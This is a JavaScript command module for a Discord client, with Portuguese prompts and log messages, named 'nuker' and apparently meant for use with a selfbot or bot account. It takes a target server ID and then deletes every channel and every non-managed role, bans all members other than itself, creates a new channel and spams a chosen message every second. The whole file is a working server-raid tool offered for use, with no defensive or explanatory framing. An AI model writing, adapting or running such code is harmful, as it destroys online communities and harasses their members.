const input = require('input');

module.exports = {
    name: 'nuker',
    description: 'Executa ações de nuker em um servidor',
    async execute(client) {
        const serverId = await input.text('[-]'.yellow + ' Digite o ID do servidor: '.green + ''.reset);
        const channelName = await input.text('[-]'.yellow + ' Digite o nome do canal personalizado: '.green + ''.reset);
        const spamMessage = await input.text('[-]'.yellow + ' Digite a mensagem para spam: '.green + ''.reset);

        const server = client.guilds.cache.get(serverId);

        if (!server) {
            console.log('[ERRO] '.red + 'Servidor não encontrado.'.reset);
            return;
        }

        // Delete all channels
        console.log('[!] '.yellow + 'Deletando todos os canais...'.green);
        server.channels.cache.forEach(channel => {
            channel.delete().then(() => {
                console.log(`Canal ${channel.name} deletado.`.green);
            }).catch(err => {
                console.error('[ERRO] '.red + `Nao deletou o canal ${channel.name}: ${err}`.red);
            });
        });

        // Delete all roles
        console.log('[!] '.yellow + 'Deletando todos os cargos...'.green);
        server.roles.cache.forEach(role => {
            if (role.managed || role.name === '@everyone') return;
            role.delete().then(() => {
                console.log('[!] '.yellow + `Cargo `.green + `${role.name} `.reset + `deletado.`.green);
            }).catch(err => {
                console.error('[ERRO] '.red + `Erro ao deletar o cargo ${role.name}: ${err}`.red);
            });
        });

        // Ban all members
        console.log('[!] '.yellow + 'Banindo todos os membros...'.green);
        server.members.cache.forEach(member => {
            if (member.id !== client.user.id) {
                member.ban({ reason: 'Nuke' }).then(() => {
                    console.log('[!] '.yellow + `Membro`.green + ` ${member.user.tag}`.reset + ` banido.`.green);
                }).catch(err => {
                    console.error('[ERRO] '.red + `Erro ao banir o membro ${member.user.tag}: ${err}`.red);
                });
            }
        });

        // Create a new channel and spam messages
        console.log('[!] '.yellow + 'Criando canal personalizado e iniciando spam...'.green);
        server.channels.create(channelName, { type: 'GUILD_TEXT' }).then(channel => {
            const spamInterval = setInterval(() => {
                channel.send(spamMessage).catch(err => {
                    console.error(`Erro ao enviar mensagem no canal ${channel.name}: ${err}`.red);
                    clearInterval(spamInterval);
                });
            }, 1000); // Send a message every second

            console.log(`Canal ${channel.name} criado.`.green);
        }).catch(err => {
            console.error(`Erro ao criar o canal ${channelName}: ${err}`.red);
        });
    }
};
